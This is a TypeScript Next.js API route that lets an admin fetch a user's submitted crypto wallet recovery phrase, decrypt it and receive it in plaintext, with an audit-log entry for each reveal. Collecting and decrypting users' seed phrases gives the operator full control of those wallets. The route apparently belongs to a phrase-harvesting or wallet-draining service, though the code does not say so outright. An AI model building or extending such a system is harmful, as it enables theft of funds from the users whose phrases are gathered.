import { NextResponse } from 'next/server';
import { q } from '@/lib/db';
import { decryptPhrase } from '@/lib/crypto';
import { getViewer } from '@/lib/session';
import { getWalletPhraseCiphertext } from '@/lib/queries';

export const dynamic = 'force-dynamic';

export async function GET(_request: Request, { params }: { params: Promise<{ id: string }> }) {
    const viewer = await getViewer();
    if (!viewer || !viewer.user.isAdmin || viewer.impersonator) {
        return NextResponse.json({ error: 'Not available' }, { status: 403 });
    }

    const { id } = await params;
    const record = await getWalletPhraseCiphertext(id);
    if (!record) return NextResponse.json({ error: 'That submission was not found.' }, { status: 404 });

    try {
        const phrase = decryptPhrase(record.phrase);

        await q`
            insert into admin_audit (actor_id, actor_email, action, target_user_id, detail)
            values (${viewer.user.id}, ${viewer.user.email}, 'wallet.phrase_reveal', ${record.userId}, ${JSON.stringify({ submissionId: id })}::jsonb)
        `;

        return NextResponse.json(
            { phrase },
            { headers: { 'cache-control': 'no-store, max-age=0', 'x-robots-tag': 'noindex' } }
        );
    } catch (error) {
        console.error('[wallet] phrase decrypt failed', error instanceof Error ? error.message : error);
        return NextResponse.json({ error: 'The phrase could not be decrypted with the current key.' }, { status: 500 });
    }
}
